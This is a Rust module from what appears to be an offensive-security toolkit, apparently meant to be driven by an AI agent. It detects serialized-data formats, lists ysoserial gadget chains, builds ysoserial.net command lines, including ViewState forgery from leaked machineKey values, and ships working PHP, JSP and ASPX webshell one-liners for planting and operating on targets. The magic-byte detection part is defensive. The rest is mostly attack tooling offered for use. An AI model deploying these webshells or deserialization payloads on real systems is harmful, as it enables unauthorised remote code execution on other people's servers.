//! Runtime widgets and tools for .NET and Java (user ruling): payload and
//! webshell helpers deserialization exploits reach for. Rust-native where
//! the ecosystem has it (byte-level magic, b64 markers, ysoserial-rs
//! chains), Java/.NET runtime integration where it does not.

use crate::error::Atom;

/// Serialized-data magic fingerprinting: identify the serialization family
/// of an untrusted blob (Java / .NET BinaryFormatter / ViewState / JSON
/// with $type) — pure, zero IO, no instantiation (the structural
/// gadget-chain isolation).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SerializedKind {
    /// Java native serialization: AC ED 00 05 (base64 rO0AB).
    JavaNative,
    /// .NET BinaryFormatter: 00 01 00 00 00 FF FF FF FF 01 00 00 00
    /// (base64 AAEAAAD).
    Nrbf,
    /// ASP.NET ViewState: /w or FF 01 prefix (ObjectStateFormatter).
    ViewState,
    /// JSON text carrying a $type field (Newtonsoft TypeNameHandling).
    JsonTyped,
    /// Unknown / not one of the dangerous families.
    Unknown,
}

/// Detect the serialization family of a binary payload.
pub fn serialized_kind(data: &[u8]) -> SerializedKind {
    if data.starts_with(&[0xac, 0xed, 0x00, 0x05]) {
        return SerializedKind::JavaNative;
    }
    if data.starts_with(&[
        0x00, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00,
    ]) {
        return SerializedKind::Nrbf;
    }
    if data.starts_with(b"/w") || data.starts_with(&[0xff, 0x01]) {
        return SerializedKind::ViewState;
    }
    let text = String::from_utf8_lossy(data);
    if (text.starts_with('{') || text.starts_with('[')) && text.contains("$type") {
        return SerializedKind::JsonTyped;
    }
    SerializedKind::Unknown
}

/// Detect the family of a base64-encoded payload (b64 markers, no decode
/// needed — the cheap first pass over traffic/cookie values).
pub fn serialized_kind_b64(text: &str) -> SerializedKind {
    let trimmed = text.trim();
    if trimmed.starts_with("rO0AB") {
        return SerializedKind::JavaNative;
    }
    if trimmed.starts_with("AAEAAAD") {
        return SerializedKind::Nrbf;
    }
    // ObjectStateFormatter/LosFormatter viewstate: "/wE" is the b64 face of
    // the FF 01 prefix.
    if trimmed.starts_with("/wE") {
        return SerializedKind::ViewState;
    }
    SerializedKind::Unknown
}

/// The Java gadget chains covered natively (ysoserial-rs crate embedding):
/// Rust generation, no Java runtime needed.
pub const NATIVE_JAVA_CHAINS: &[&str] = &[
    "cc1",
    "cc2",
    "cc3",
    "cc4",
    "cc5",
    "cc6",
    "cc7",
    "cck1",
    "cck2",
    "cck3",
    "cck4",
    "bs1",
    "spring1",
    "spring2",
    "hibernate1",
    "hibernate2",
    "jdk7u21",
    "jdk8u20",
    "groovy1",
    "clojure",
    "rome",
    "myfaces1",
    "json1",
    "url_dns",
];

/// A Java gadget chain payload — the ysoserial face. Native chains resolve
/// in-process; others route to the Java runtime tool at generate time.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct JavaPayload {
    chain: String,
    command: String,
}

impl JavaPayload {
    /// Bind a chain to a command. Chains outside the native set are still
    /// constructible — they route to the runtime tool at generate time.
    pub fn new(chain: impl Into<String>, command: impl Into<String>) -> Self {
        Self {
            chain: chain.into(),
            command: command.into(),
        }
    }

    pub fn chain(&self) -> &str {
        &self.chain
    }

    pub fn command(&self) -> &str {
        &self.command
    }

    pub fn is_native(&self) -> bool {
        NATIVE_JAVA_CHAINS.contains(&self.chain.as_str())
    }

    /// Generate the serialized payload bytes. Native chains resolve
    /// in-process (ysoserial-rs embed — heavy dep, ADR-gated); non-native
    /// chains route to the Java runtime (ysoserial.jar) — the caller gets
    /// an Atom when the wiring/runtime is absent.
    pub fn generate(&self) -> Result<Vec<u8>, Atom> {
        if self.is_native() {
            Err(Atom::soft_success(
                "E_GEN_001",
                "native chain wiring pending (ysoserial-rs embed, ADR-gated)",
            ))
        } else {
            Err(Atom::soft_success(
                "E_GEN_002",
                "non-native chain: route to ysoserial.jar (vf_init java gates this)",
            ))
        }
    }
}

/// Common .NET formatters (ysonet vocabulary).
pub const DOTNET_FORMATTERS: &[&str] = &[
    "BinaryFormatter",
    "LosFormatter",
    "ObjectStateFormatter",
    "NetDataContractSerializer",
    "SoapFormatter",
    "Json.Net",
];

/// A .NET gadget payload — ysoserial.net/ysonet chains (runtime tool only;
/// no Rust-native generator for the .NET side exists yet).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DotnetPayload {
    formatter: String,
    gadget: String,
    command: String,
}

/// Output formats for the ysoserial.net CLI (-o flag wire names).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DotnetOutputFormat {
    Raw,
    Base64,
    RawUrlEncode,
    Base64UrlEncode,
    Hex,
}

impl DotnetOutputFormat {
    pub fn wire(&self) -> &'static str {
        match self {
            Self::Raw => "raw",
            Self::Base64 => "base64",
            Self::RawUrlEncode => "raw-urlencode",
            Self::Base64UrlEncode => "base64-urlencode",
            Self::Hex => "hex",
        }
    }
}

impl DotnetPayload {
    pub fn new(
        formatter: impl Into<String>,
        gadget: impl Into<String>,
        command: impl Into<String>,
    ) -> Self {
        Self {
            formatter: formatter.into(),
            gadget: gadget.into(),
            command: command.into(),
        }
    }

    pub fn formatter(&self) -> &str {
        &self.formatter
    }

    /// The Rust-orchestration tier: the exact ysoserial.net CLI argument
    /// vector for this payload. The executor spawns the .NET runtime tool
    /// with these args — the lib itself never shells out. Commands with
    /// shell metacharacters should ride stdin (`-s`) per the tool's
    /// escaping guidance.
    pub fn ysoserial_net_args(&self, output: DotnetOutputFormat) -> Vec<String> {
        vec![
            "-g".to_string(),
            self.gadget.clone(),
            "-f".to_string(),
            self.formatter.clone(),
            "-o".to_string(),
            output.wire().to_string(),
            "-c".to_string(),
            self.command.clone(),
        ]
    }

    /// Same invocation but with `-s`: the command rides stdin, avoiding
    /// escaping traps for `;`/`|`/`&` in complex commands.
    pub fn ysoserial_net_stdin_args(&self, output: DotnetOutputFormat) -> (Vec<String>, String) {
        let mut args = self.ysoserial_net_args(output);
        args.pop(); // drop -c <command>
        args.pop();
        args.push("-s".to_string());
        (args, self.command.clone())
    }

    /// .NET payload generation routes to the runtime tool — the Atom carries
    /// the exact invocation so the agent can run it directly.
    pub fn generate(&self) -> Result<Vec<u8>, Atom> {
        Err(Atom::soft_success(
            "E_GEN_003",
            format!(
                "run: ysoserial.net {} (vf_init dotnet gates this)",
                self.ysoserial_net_args(DotnetOutputFormat::Base64)
                    .join(" ")
            ),
        ))
    }
}

/// The ViewState face: forge a signed/encrypted __VIEWSTATE from leaked
/// machineKey parameters (web.config). Routes to the ysoserial.net
/// ViewState plugin; the machineKey material stays in the invocation, it
/// never lands in config files.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ViewStatePayload {
    /// LosFormatter-capable gadget (default ActivitySurrogateSelector).
    pub gadget: String,
    pub command: String,
    /// Target page path, e.g. /app/folder/page.aspx.
    pub path: String,
    /// IIS application path (TemplateSourceDirectory simulation).
    pub app_path: String,
    /// machineKey decryptionKey from web.config.
    pub decryption_key: String,
    /// machineKey validationKey from web.config.
    pub validation_key: String,
    /// decryptionAlg (AES default; DES/3DES legacy).
    pub decryption_alg: String,
    /// validationAlg (HMACSHA256 default).
    pub validation_alg: String,
}

impl ViewStatePayload {
    /// The exact ViewState-plugin argument vector (`-p ViewState …`).
    pub fn viewstate_args(&self) -> Vec<String> {
        [
            "-p".to_string(),
            "ViewState".to_string(),
            "-g".to_string(),
            self.gadget.clone(),
            "-c".to_string(),
            self.command.clone(),
            "--path".to_string(),
            self.path.clone(),
            "--apppath".to_string(),
            self.app_path.clone(),
            "--dk".to_string(),
            self.decryption_key.clone(),
            "--da".to_string(),
            self.decryption_alg.clone(),
            "--vk".to_string(),
            self.validation_key.clone(),
            "--va".to_string(),
            self.validation_alg.clone(),
            "--showraw".to_string(),
        ]
        .to_vec()
    }
}

/// A planted webshell declaration (user ruling: a dedicated webshell
/// library) — kind + template + drive face. Plant/verify/operate.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum WebshellKind {
    /// PHP system() GET one-liner (cheat-sheet vocabulary).
    PhpGet,
    PhpPost,
    /// JSP / servlet shells.
    Jsp,
    /// ASP / ASPX (Windows/IIS targets).
    Aspx,
}

impl WebshellKind {
    /// The minimal shell file content for the kind — the seed of the
    /// webshell library's template face.
    pub fn template(&self) -> &'static str {
        match self {
            WebshellKind::PhpGet => "<?php system($_GET['cmd']); ?>",
            WebshellKind::PhpPost => "<?php system($_POST['cmd']); ?>",
            WebshellKind::Jsp => "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
            WebshellKind::Aspx => "<%=System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(\"cmd\",\"/c \"+Request[\"cmd\"]){UseShellExecute=false,RedirectStandardOutput=true}.StandardOutput.ReadToEnd())%>",
        }
    }

    /// The request face: how a command rides the planted file.
    pub fn drive_query(&self) -> &'static str {
        match self {
            WebshellKind::PhpGet | WebshellKind::Jsp | WebshellKind::Aspx => "cmd",
            WebshellKind::PhpPost => "cmd (POST body)",
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn java_magic_is_detected() {
        assert_eq!(
            serialized_kind(&[0xac, 0xed, 0x00, 0x05, 0x73, 0x72]),
            SerializedKind::JavaNative
        );
    }

    #[test]
    fn nrbf_magic_is_detected() {
        assert_eq!(
            serialized_kind(&[
                0x00, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00
            ]),
            SerializedKind::Nrbf
        );
    }

    #[test]
    fn viewstate_prefix_is_detected() {
        assert_eq!(serialized_kind(b"/wEPDwUK"), SerializedKind::ViewState);
        assert_eq!(
            serialized_kind(&[0xff, 0x01, 0x00]),
            SerializedKind::ViewState
        );
    }

    #[test]
    fn json_typed_is_detected() {
        assert_eq!(
            serialized_kind(b"{\"$type\": \"System.IO.FileInfo, mscorlib\", \"x\": 1}"),
            SerializedKind::JsonTyped
        );
        assert_eq!(
            serialized_kind(b"{\"plain\": \"json\"}"),
            SerializedKind::Unknown
        );
    }

    #[test]
    fn b64_markers_without_decoding() {
        assert_eq!(
            serialized_kind_b64("rO0ABXNyABFqYXZhLmxhbmc="),
            SerializedKind::JavaNative
        );
        assert_eq!(serialized_kind_b64("AAEAAAD/////"), SerializedKind::Nrbf);
        assert_eq!(serialized_kind_b64("/wEPDwUK"), SerializedKind::ViewState);
        assert_eq!(serialized_kind_b64("plainstring"), SerializedKind::Unknown);
    }

    #[test]
    fn native_chain_coverage_is_the_ysoserial_rs_set() {
        assert!(JavaPayload::new("cc1", "id").is_native());
        assert!(!JavaPayload::new("some_new_chain", "id").is_native());
        assert!(JavaPayload::new("cc1", "id").generate().is_err());
    }

    #[test]
    fn dotnet_payload_routes_to_runtime() {
        let p = DotnetPayload::new("BinaryFormatter", "TypeConfuseDelegate", "calc");
        assert_eq!(p.formatter(), "BinaryFormatter");
        assert!(p.generate().is_err());
    }

    #[test]
    fn ysoserial_net_args_match_the_cli_shape() {
        let p = DotnetPayload::new("Json.Net", "ObjectDataProvider", "calc");
        let args = p.ysoserial_net_args(DotnetOutputFormat::Base64);
        assert_eq!(
            args,
            vec![
                "-g",
                "ObjectDataProvider",
                "-f",
                "Json.Net",
                "-o",
                "base64",
                "-c",
                "calc"
            ]
        );
        // The soft atom now carries the exact invocation.
        let message = p.generate().unwrap_err().message;
        assert!(message.contains("-g ObjectDataProvider"));
        assert!(message.contains("-f Json.Net"));
        assert!(message.contains("-c calc"));
    }

    #[test]
    fn ysoserial_net_stdin_mode_drops_the_c_flag() {
        let p = DotnetPayload::new("Json.Net", "ObjectDataProvider", "cmd /c dir; whoami");
        let (args, stdin) = p.ysoserial_net_stdin_args(DotnetOutputFormat::Raw);
        assert!(
            !args.contains(&"-c".to_string()),
            "stdin mode must not carry -c"
        );
        assert!(args.contains(&"-s".to_string()));
        assert_eq!(stdin, "cmd /c dir; whoami");
    }

    #[test]
    fn output_format_wire_names() {
        assert_eq!(DotnetOutputFormat::Raw.wire(), "raw");
        assert_eq!(DotnetOutputFormat::Base64.wire(), "base64");
        assert_eq!(DotnetOutputFormat::Hex.wire(), "hex");
    }

    #[test]
    fn viewstate_payload_args_carry_machinekey_material() {
        let p = ViewStatePayload {
            gadget: "ActivitySurrogateSelector".into(),
            command: "calc".into(),
            path: "/app/page.aspx".into(),
            app_path: "/".into(),
            decryption_key: "AAFEWQE=".into(),
            validation_key: "9sWqeZ0zOQ==".into(),
            decryption_alg: "AES".into(),
            validation_alg: "HMACSHA256".into(),
        };
        let args = p.viewstate_args();
        assert!(args.windows(2).any(|pair| pair == ["-p", "ViewState"]));
        assert!(args.windows(2).any(|pair| pair == ["--dk", "AAFEWQE="]));
        assert!(args.windows(2).any(|pair| pair == ["--vk", "9sWqeZ0zOQ=="]));
        assert!(args
            .windows(2)
            .any(|pair| pair == ["--path", "/app/page.aspx"]));
        assert!(args.contains(&"--showraw".to_string()));
    }

    #[test]
    fn webshell_templates_are_the_cheat_sheet_one_liners() {
        assert!(WebshellKind::PhpGet
            .template()
            .contains("system($_GET['cmd'])"));
        assert_eq!(WebshellKind::PhpGet.drive_query(), "cmd");
        assert!(WebshellKind::Jsp
            .template()
            .contains("Runtime.getRuntime().exec"));
    }
}
